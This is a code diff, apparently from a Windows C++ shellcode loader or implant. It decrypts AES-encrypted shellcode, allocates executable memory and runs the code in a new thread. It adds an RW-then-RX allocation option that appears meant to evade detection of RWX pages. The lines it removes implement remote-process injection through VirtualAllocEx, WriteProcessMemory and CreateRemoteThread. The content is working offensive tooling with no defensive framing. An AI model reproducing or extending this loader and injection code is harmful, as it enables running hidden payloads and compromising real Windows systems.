@@ -493,21 +493,16 @@ std::vector<std::string> splitString(const std::string& str, const std::string& 
     return substrings;
 }
 
-int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {
+DWORD WINAPI ThreadFunc(LPVOID lpParameter)
+{
+    // Cast the parameter back to the shellcode pointer type
+    unsigned char* shellcode = (unsigned char*)lpParameter;
 
-    LPVOID pRemoteCode = NULL;
-    HANDLE hThread = NULL;
+    // Execute the shellcode
+    void (*execute)() = (void (*)())shellcode;
+    execute();
 
-
-    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
-
-    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
-    if (hThread != NULL) {
-        WaitForSingleObject(hThread, 500);
-        CloseHandle(hThread);
-        return 0;
-    }
+    return 0;
 }
 
 #define FUCKUP_PAD "1234567812345678"
@@ -766,7 +761,7 @@ int main()
                 // Now need to decrypt
                 AesDecrypt(enc_shc, iv);
 
-                // Need to remove the 16 byte pad at the front...
+                // Need to remove the 16 byte fcpad at the front...
                 std::string raw_code = enc_shc.substr(16, enc_shc.length() - 1);
 
                 // Allocate some space for it
@@ -778,9 +773,26 @@ int main()
                 }
                 // Now execute the shellcode in a new thread
                 HANDLE hThread = NULL;
-                void* exec = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-                memcpy(exec, pl, len);
-                hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
+                void* exec_mem;
+
+                // if directed to use RW memory only
+                if (parsed_cmd.size() == 4 && parsed_cmd[3] == "RX") {
+                    DWORD oldprotect = 0;
+
+                    exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+                    memcpy(exec_mem, pl, len);
+
+                    bool rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);
+
+                    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, exec_mem, 0, 0);
+                }
+                // If directed to use RWX memory (default)
+                else {
+                    exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                    memcpy(exec_mem, pl, len);
+                    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
+                }                
 
                 // Close the thread handle
                 CloseHandle(hThread);
